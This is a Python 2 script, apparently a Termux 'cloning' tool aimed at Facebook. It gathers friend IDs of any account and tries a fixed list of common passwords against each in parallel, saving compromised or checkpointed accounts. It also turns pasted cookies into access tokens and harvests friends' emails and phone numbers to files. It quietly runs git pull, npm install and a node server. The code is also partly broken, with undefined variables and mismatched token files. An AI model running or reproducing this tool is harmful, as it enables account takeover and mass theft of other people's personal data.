#!/usr/bin/python
# coding=utf-8
# Originally Written By:Muhammad Hamza
# Source : Python2"
# Donot Recode It. 

#Import module
try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,cookielib,getpass,mechanize,requests
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system('termux-setup-storage')
    os.system('python2 jam.py')
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
bd = random.randint(2e+07, 3e+07)
sim = random.randint(20000, 40000)
header = {
    'x-fb-connection-bandwidth': repr(bd),
    'x-fb-sim-hni': repr(sim),
    'x-fb-net-hni': repr(sim),
    'x-fb-connection-quality': 'EXCELLENT',
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
    'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger' }
os.system('git pull')
os.system('clear')
c = "\033[1;32m""\033[0;97m""\033[1;32m"
c2 = "\033[0;97m""\033[1;32m""\033[0;97m"
c3 = "\033[1;31m""\033[0;97m""\033[1;31m"
os.system('git pull')
os.system('clear')
logo = ('\n    .S   .S_SSSs     .S_SsS_S.   \n   .SS  .SS~SSSSS   .SS~S*S~SS.  \n   S%S  S%S   SSSS  S%S  Y S%S  \n   S%S  S%S    S%S  S%S  •  S%S  \n   S&S  S%S•SSSS%S  S%S  •  S%S  \n   S&S  S&S  SSS%S  S&S  °  S&S  \n   S&S  S&S    S&S  S&S     S&S  \n   S&S  S&S    S&S  S&S     S&S  \n   d*S  S*S    S&S  S*S     S*S  \n  .S*S  S*S    S*S  S*S     S*S  \nsdSSS   S*S    S*S  S*S     S*S  \nYSSY    SSS    S*S  SSS     S*S  \n               SP           SP   \n               Y            Y    \n-----------------------------------------------\n➣ Author : Jam Shahrukh x Xtylo Ali Raza\n➣ Github : https://github.com/Blacklisted\n➣ Fb Page : Jam Shahrukh Official\n-----------------------------------------------')  
def reg():
    os.system('clear')
    print logo
    print ''
    print '\033[1;31;1mTake The Free Approval For Login'
    print ''
    time.sleep(1)
    
    try:
        to = open('/sdcard/.hst.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/jam-shahrukh/jam/main/jam/id.txt').text
    if to in r:
        os.system('cd ..... && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd ..... && node index.js &')
        time.sleep(5)
        ip()
    else:
        os.system('clear')
        print logo
        print ''
        print '\tApproved Failed'
        print ''
        print ' \033[1;92mYour Id Is Not Approved Already '
        print ''
        print ' \033[1;92mCopy token id and send to Jam Shahrukh'
        print ''
        print ' \033[1;92mYour id: ' + to
        print ''
        raw_input('\033[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+923053176060')
        reg()


def reg2():
    os.system('clear')
    print logo
    print ''
    print '\tApproval not detected'
    print ''
    print ' \033[1;92mCopy and press enter , And Send Me On +923053176060'
    print ''
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    print ''
    raw_input(' Press enter to go to whatsapp ')
    os.system('xdg-open https://wa.me/+923053176060')
    sav = open('/sdcard/.hst.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\033[1;92m Press enter to check Approval ')
    reg()


def ip():
    os.system('clear')
    print logo
    print ''
    print '\tCollecting device info'
    print ''
    
    try:
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        ips = z['query']
        country = z['country']
        regi = z['regionName']
        network = z['isp']
    except:
        pass

    print '\033[1;93m Your ip: ' + ips
    time.sleep(2)
    print ''
    print '\033[1;93m Your country: ' + country
    time.sleep(2)
    print ''
    print '\033[1;92m Your region: ' + regi
    time.sleep(2)
    print ''
    print ' \033[1;92mYour network: ' + network
    time.sleep(1)
    print ''
    print ' Loading ...'
    time.sleep(1)
    log_menu()


def log_menu():
    
    try:
        t_check = open('access_token.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print ''
        print '\033[1;31;1m~~~~ Login menu~~~~'
        print ''
        print '\033[1;92m[1] Login with FaceBook'
        print '\033[1;92m[2] Login with token'
        print '\033[1;92m[3] Login with cookies'
        print ''
        log_menu_s()



def log_menu_s():
    s = raw_input(' \033[1;93mSelect One: ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
    elif s == '3':
        log_cookie()
    else:
        print ''
        print '\\ Select valid option '
        print ''
        log_menu_s()


def log_fb():
    os.system('clear')
    print logo
    print ''
    print '\033[1;31;1mLogin with id/pass'
    print ''
    lid = raw_input('\033[1;92m Id/mail/no: ')
    pwds = raw_input(' \033[1;93mPassword: ')
    
    try:
        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
        q = json.loads(data)
        if 'loc' in q:
            ts = open('access_token.txt', 'w')
            ts.write(q['loc'])
            ts.close()
            menu()
        elif 'www.facebook.com' in q['error']:
            print ''
            print ' User must verify account before login'
            print ''
            raw_input('\033[1;92m Press enter to try again ')
            log_fb()
        else:
            print ''
            print ' Id/Pass may be wrong'
            print ''
            raw_input(' \033[1;92mPress enter to try again ')
            log_fb()
    except:
        print ''
        print 'Exiting tool'
        os.system('exit')



def log_token():
    os.system('clear')
    print logo
    print ''
    print '\033[1;93mLogin with token'
    print ''
    tok = raw_input(' \033[1;92mPaste token here: ')
    print ''
    t_s = open('access_token.txt', 'w')
    t_s.write(tok)
    t_s.close()
    menu()


def log_cookie():
    os.system('clear')
    print logo
    print ''
    print '\033[1;31;1mLogin Cookies'
    print ''
    
    try:
        cookie = raw_input(' Paste cookies here: ')
        data = {
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36',
            'referer': 'https://m.facebook.com/',
            'host': 'm.facebook.com',
            'origin': 'https://m.facebook.com',
            'upgrade-insecure-requests': '1',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'content-type': 'text/html; charset=utf-8',
            'cookie': cookie }
        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
        c2 = re.search('(EAAA\\w+)', c1.text)
        hasil = c2.group(1)
        ok = open('access_token.txt', 'w')
        ok.write(hasil)
        ok.close()
        menu()
    except AttributeError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \033[1;92mPress enter to try again ')
        log_menu()
    except UnboundLocalError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \033[1;92mPress enter to try again ')
        log_menu()
    except requests.exceptions.SSLError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \033[1;92mPress enter to try again ')
        log_menu()
			
#Menu
def menu():
    os.system('clear')
    
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        print ''
        print logo
        print ''
        print '\033[1;31;1mLogin FB id to continue'
        print ''
        time.sleep(1)
        log_menu()

    
    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        z = q['name']
    except (KeyError, IOError):
        print logo
        print ''
        print '\t Account Cheekpoint\x1b[0;97m'
        print ''
        os.system('rm -rf access_token.txt')
        time.sleep(1)
        log_menu()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print '\t Turn on mobile data/wifi\x1b[0;97m'
        print ''
        raw_input(' \033[1;92mPress enter after turning on mobile data/wifi ')
        menu()
    os.system("clear")
    print logo
    print "  \033[1;92mLogged in user: " + z
    print (47*"-")
    print "[1] Start Cloning."
    print "[2] Clone With Pass Choice."
    print "[3] Grabbing Tools."
    print "[4] Auto Del Tools."
    print "[5] Update jam Tool."
    print "[6] Follow Me On Facebook."
    print "[7] Logout"
    print ('                  ')
    men()

def men():
	rana = raw_input("Choose Option >>  ")
	if rana =="":
		print " Wrong Input"
		men()
	elif rana =="1":
		crack()
	elif rana =="2":
	    os.system('clear')
	    hamza('[!] Please Wait While Page Is Loding.')
	    hopss('CKG-10%...')
	    hopss('CKG-20%...')
	    hopss('CKG-50%...')
	    hopss('CKG-70%...')
	    hopss('CKG-90%...')
	    hopss('CKG-95%...')
	    os.system('python2 .choice.py')
	    time.sleep(1)
	elif rana =="3":
		grab()
	elif rana =="4":
		bot()
	elif rana =="5":
		os.system('clear')
		print logo
		hamza('[✓] Please Wait While Tool Is Updating')
		os.system('git pull origin master')
		hamza('[✓] Tool Has Been Update Successfully')
		hamza('[✓] Please Wait While Update Is Setting Up On Your Mobile Phone')
		time.sleep(3)
		log_menu()
	elif rana =="6":
		os.system('xdg-open https://www.facebook.com/jam.shahrukh124')
		menu()
	elif rana =="7":
		os.system('rm -rf login.txt')
		hamza('[✓] Logged Out Successfully')
		log_menu()
	else:
		print "[!] Wrong Input"
		men()
	
##### INFO #####
def crack():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		log_menu()
	os.system('clear')
	print logo
	print "[1] Clone From Friendlist."
	print "[2] Clone From Any Public ID."
	print "[3] Clone From File."
	print "[0] Back."
	crack_menu()

def crack_menu():
	crm = raw_input("Choose Option >>  ")
	if crm =="":
		print "[!] Filled Incorrectly"
		crack_menu()
	elif crm =="1":
		os.system('clear')
		print logo
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif crm =="2":
		os.system('clear')
		print logo
		idt = raw_input("[+] Input ID: ")
		
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			z = op['name']
		except KeyError:
			print"[!] ID Not Found!"
			raw_input("\nPress Enter To Back  ")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
                        na = i['name']
                        nm = na.rsplit(' ')[0]
                        id.append(uid + '|' + nm)
	elif crm =="3":
	    os.system('clear')
	    print logo
	    try:
	        idlist= raw_input('[+] File Name: ')
	        for line in open(idlist ,'r').readlines():
	            id.append(line.strip())
	    except IOError:
	         print"[!] File Not Found."
	         raw_input('Press Enter To Back. ')
	         crack()
	   
	        
	        
	elif crm =="0":
		menu()
	else:
		print "Filled Incorrectly"
		crack_menu()
	
        hamza('[✓] Total Friends: '+str(len(id)))
        time.sleep(0.5)
	hamza('[✓] The Process Has Been Started.')
	time.sleep(0.5)
        hamza('[!] To Stop Process Press CTRL Then Z')
        time.sleep(0.5)
        print (47*"-")
     
	
	
			
	def main(arg):
		global cpb,oks
		user = arg
		(uid, name) = user.split('|')
		try:
		    os.mkdir('save')
		except OSError:
		    pass
		try:
			a = requests.get("https://graph.facebook.com/"+uid+"/?access_token="+toket)
			b = json.loads(a.text)
			pass1='234567'
			data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
			q = json.load(data)
			if "access_token" in q:
				print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + uid + ' \x1b[1;96m|\x1b[1;96m ' + pass1
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + uid + ' \x1b[1;91m|\x1b[1;91m ' + pass1
					crt = open("save/checkpoint.txt", "a")
					crt.write(uid+"|"+pass1+"\n")
					crt.close()
					checkpoint.append(uid+pass1)
				else:
					pass2 = '223344'
					data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
					q = json.load(data)
					if "access_token" in q:
						print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + uid + ' \x1b[1;96m|\x1b[1;96m ' + pass2
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + uid + ' \x1b[1;91m|\x1b[1;91m ' + pass2
							crt = open("save/checkpoint.txt", "a")
							crt.write(uid+"|"+pass2+"\n")
							crt.close()
							checkpoint.append(uid+pass2)
						else:
							pass3 = '334455'
							data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
							q = json.load(data)
							if "access_token" in q:
								print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + uid + ' \x1b[1;96m|\x1b[1;96m ' + pass3
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + uid + ' \x1b[1;91m|\x1b[1;91m ' + pass3
									crt = open("save/checkpoint.txt", "a")
									crt.write(uid+"|"+pass3+"\n")
									crt.close()
									checkpoint.append(uid+pass3)
								else:
									pass4 = '445566'
									data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
									q = json.load(data)
									if "access_token" in q:
										print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + uid + ' \x1b[1;96m|\x1b[1;96m ' + pass4
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error_msg"]:
											print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + uid + ' \x1b[1;91m|\x1b[1;91m ' + pass4
											crt = open("save/checkpoint.txt", "a")
											crt.write(uid+"|"+pass4+"\n")
											crt.close()
											checkpoint.append(uid+pass4)
										else:
											pass5 = '556677'
											data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers = header).text
											q = json.load(data)
											if "access_token" in q:
												print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + uid + ' \x1b[1;96m|\x1b[1;96m ' + pass5
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in q["error_msg"]:
													print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + uid + ' \x1b[1;91m|\x1b[1;91m ' + pass5
													crt = open("save/checkpoint.txt", "a")
													crt.write(uid+"|"+pass5+"\n")
													crt.close()
													checkpoint.append(uid+pass5)
												else:
													pass6 = '667788'
													data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers = header).text
													q = json.load(data)
													if "access_token" in q:
														print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + uid + ' \x1b[1;96m|\x1b[1;96m ' + pass6
														oks.append(uid+pass6)
													else:
														if "www.facebook.com" in q["error_msg"]:
															print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + uid + ' \x1b[1;91m|\x1b[1;91m ' + pass6
															crt = open("save/checkpoint.txt", "a")
															crt.write(uid+"|"+pass6+"\n")
															crt.close()
															checkpoint.append(uid+pass6)
														else:
															pass7 = '778899'
															data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers = header).text
															q = json.load(data)
															if "access_token" in q:
																print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + uid + ' \x1b[1;96m|\x1b[1;96m ' + pass7
																oks.append(uid+pass7)
															else:
																if "www.facebook.com" in q["error_msg"]:
																	print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + uid + ' \x1b[1;91m|\x1b[1;91m ' + pass7
																	crt = open("save/checkpoint.txt", "a")
																	crt.write(uid+"|"+pass7+"\n")
																	crt.close()
																	checkpoint.append(uid+pass7)           					
								                                       
				                                                                           
	
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m----------------------------------------------"
	hamza('[✓] Process Has Been Completed.')
	hamza('\033[1;97m[✓] Checkpoint IDS Has Been Saved.')
	xx = str(len(oks))
	xxx = str(len(checkpoint))
	print ("[✓] Total \033[1;32mOK/\033[1;97mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(checkpoint)))
	print (47*"-")
	
	raw_input("\nPress Enter To Back ")
	menu()	
	

        
##### Grab #####
def grab():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		log_menu()
	os.system('clear')
	print logo
	print "[1] Extract Numeric IDs From Public ID."
	print "[2] Extract Email's From Public ID."
	print "[3] Extract Phone Number From Public ID."
	print "[0] Back."
	print('          ')
	grab_menu()
	
#Grab_input
def grab_menu():
	grm = raw_input("\nChoose Option >> ")
	if grm =="":
		print " Wrong Input"
		grab_menu()
	elif grm =="1":
		idfromfriend()
	elif grm =="2":
		emailfromfriend()
	elif grm =="3":
		numberfromfriend()
	elif grm =="0":
		menu()
	else:
		print "[!] Wrong input"
		grab_menu()
		


##### Extract IDs From Public Id #####
def idfromfriend():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		log_menu()
	try:
		os.mkdir('save')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		idt = raw_input("[+] Input ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"[✓] Account Name : "+op["name"]
		except KeyError:
			print"[!] Friend Not Found"
			raw_input("Press Enter To Back ")
			grab()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(5000)&access_token="+toket)
		z=json.loads(r.text)
		hamza('[✓] Getting Friends Numeric IDs...')
		print"--------------------------------------"
		bz = open('save/id.txt','w')
		for a in z['friends']['data']:
			idh.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r["+str(len(idh))+" ] => "+a['id']),;sys.stdout.flush();time.sleep(0.001)
		bz.close()
		print '\r[✓] The Process Has Been Completed.'
		print"\r[✓] Total IDs Founded : "+str(len(idh))
		done = raw_input("\r[?] Save File With Name : ")
		print("\r[✓] The File Has Been Saved As save/"+done)
		raw_input("\nPress Enter To Back ")
		grab()
	except IOError:
		print"[!] Error While Creating file"
		raw_input("\nPress Enter To Back ")
		grab()
	except (KeyboardInterrupt,EOFError):
		print("[!]The Process Has Been Stopped")
		raw_input("\nPress Enter To Back ")
		grab()
	except KeyError:
		print('[!] Error')
		raw_input("\nPress Enter To Back ")
		grab()
	except requests.exceptions.ConnectionError:
		print"[✖] No Connection"
		time.sleep(1)
		grab()

##### EMAIL FROM Friend#####
def emailfromfriend():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		log_menu()
	try:
		os.mkdir('save')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		idt = raw_input("[+] Input ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"[✓] Account Name : "+op["name"]
		except KeyError:
			print"[!] Account Not Found"
			raw_input("\nPress Enter To Back ")
			grab()
		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
		a = json.loads(r.text)
		hamza('[✓] Getting Emails From')
		print 40*"\033[1;97m-"
		bz = open('save/email.txt','w')
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				emfromfriend.append(z['email'])
				bz.write(z['email'] + '\n')
				print ("\r\033[1;97m[ \033[1;97m"+str(len(emfromfriend))+"\033[1;97m ]\033[1;97m  \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print "----------------------------------"
		print '\r[✓] Successfully Extracted Mails'
		print"\r[✓] Total Mail Founded : "+str(len(emfromfriend))
		done = raw_input("\r\033[1;97m[✓] \033[1;97mSave File With Name\033[1;97m :\033[1;97m ")
		print("\r[✓] File Has Been Saved As : save/"+done)
		raw_input("\nPress Enter  To Back ")
		grab()
	except IOError:
		print"[!] Error While Creating file"
		raw_input("\nPress Enter To Back ")
		grab()
	except (KeyboardInterrupt,EOFError):
		print("[!] Process Has Been Stopped")
		raw_input("\nPress Enter To Back ")
		grab()
	except KeyError:
		print('[!] Error')
		raw_input("\nPress Enter To Back ")
		grab()
	except requests.exceptions.ConnectionError:
		print"\033[1;97m[✖] No Connection"
		time.sleep(1)
		grab()
		


##### Number From Public Id #####
def numberfromfriend():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		log_menu()
	try:
		os.mkdir('save')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		idt = raw_input("[+] Input ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"[✓] Account Name : "+op["name"]
		except KeyError:
			print"[!] Friend Not Found"
			raw_input("\nPress Enter To Back ")
			grab()
		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
		a = json.loads(r.text)
		hamza('[✓] Getting All Numbers')
		print 40*"\033[1;97m-"
		bz = open('save/number.txt','w')
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				nofromfriend.append(z['mobile_phone'])
				bz.write(z['mobile_phone'] + '\n')
				print ("\r\033[1;97m[ \033[1;97m"+str(len(nofromfriend))+"\033[1;97m ]\033[1;97m \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.001)
			except KeyError:
				pass
		bz.close()
		print "-----------------------------------"
		print"\r[✓] Total Number Founded : "+str(len(nofromfriend))
		done = raw_input("\r[?] Save File With Name: ")
		print("\r[✓] File Has Been Saved As save/"+done)
		raw_input("\nPress Enter To Back ")
		grab()
	except IOError:
		print"[!] Error While Creating file"
		raw_input("\nPress Enter To Back ")
		grab()
	except (KeyboardInterrupt,EOFError):
		print("[!]The Process Has Been Stopped")
		raw_input("\nPress Enter To Back")
		grab()
	except KeyError:
		print('[!] Error')
		raw_input("\nPress Enter To Back ")
		grab()
	except requests.exceptions.ConnectionError:
		print"\n[✖] No Connection"
		time.sleep(1)
		grab()

##### MENU BOT #####
#----------------------------------------#
def bot():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		log_menu()
	os.system('clear')
	print logo
	print "[1] Auto Delete Posts."
	print "[2] Auto Accept Friend Requests."
	print "[3] Auto Unfriend All."
	print "[0] Back."
	print ('         ')
	bot_menu()
	
def bot_menu():
	bots = raw_input("\nChoose Option >> ")
	if bots =="":
		print "[!] Wrong Input"
		bot_menu()
	elif bots =="1":
		deletepost()
	elif bots =="2":
		accept()
	elif bots =="3":
		unfriend()
	elif bots =="0":
		menu()
	else:
		print "[!] Wrong Input"
		bot_menu()
		


##### Auto Delt Post #####
def deletepost():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
		nam = requests.get('https://graph.facebook.com/me?access_token='+toket)
		lol = json.loads(nam.text)
		name = lol['name']
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(0.1)
		log_menu()
	os.system('clear')
	print logo
	print("[✓] Account Name : "+nama)
	hamza("[✓] The Process Has Been Started")
	print (40*"-")
	asu = requests.get('https://graph.facebook.com/me/feed?access_token='+toket)
	asus = json.loads(asu.text)
	for p in asus['data']:
		id = p['id']
		piro = 0
		url = requests.get('https://graph.facebook.com/'+id+'?method=delete&access_token='+toket)
		ok = json.loads(url.text)
		try:
			error = ok['error']['message']
			print '\033[1;97m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;97m] \033[1;97m[!] Failed'
		except TypeError:
			print '\033[1;97m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;97m \033[1;97[✓] [Deleted]'
			piro += 1
		except requests.exceptions.ConnectionError:
			print"\033[1;91m[!] Connection Error"
			raw_input("\nPress Enter To Back ")
			bot()
	print (40*"-")
	print"[✓] The Process Has Been Completed. "
	raw_input("\nPress Enter To Back ")
	bot()
	
##### ACCEPT FRIEND #####
def accept():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		log_menu()
	os.system('clear')
	print logo
	limit = raw_input("[+] Enter Limit To Accept Requests : ")
	r = requests.get('https://graph.facebook.com/me/friendrequests?limit='+limit+'&access_token='+toket)
	teman = json.loads(r.text)
	if '[]' in str(teman['data']):
		print"No friend Request"
		raw_input("Press Enter To Back ")
		bot()
	hamza('[✓] The Process Has Been Start')
	print (40*"-")
	for i in teman['data']:
		gas = requests.post('https://graph.facebook.com/me/friends/'+i['from']['id']+'?access_token='+toket)
		a = json.loads(gas.text)
		if 'error' in str(a):
			print "[!] [Failed] | "+i['from']['name']
		else:
			print "[!] [Accepted] |  "+i['from']['name']
	print (40*"-")
	print"[✓] The Process Has Been Completed."
	raw_input("\nPress Enter To Back ")
	bot()
	
##### UNFRIEND ####
def unfriend():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		log_menu()
	os.system('clear')
	print logo
	hamza('[✓] The Process Has Been Started.')
	print "[✓] Press CTRL Z to Stop Process."
	print (50*"-")
	try:
		pek = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
		cok = json.loads(pek.text)
		for i in cok['data']:
			name = i['name']
			id = i['id']
			requests.delete("https://graph.facebook.com/me/friends?uid="+id+"&access_token="+toket)
			print "[✓] [Unfriended] | "+name
	except IndexError: pass
	except KeyboardInterrupt:
		print "[!]The Process Has Been Stopped"
		raw_input("\n Press Enter To Back ")
		bot()
	print"[✓] The Process Has Been Completed."
	raw_input("Press Enter To Back ")
	bot()
	
if __name__ == '__main__':
	reg()


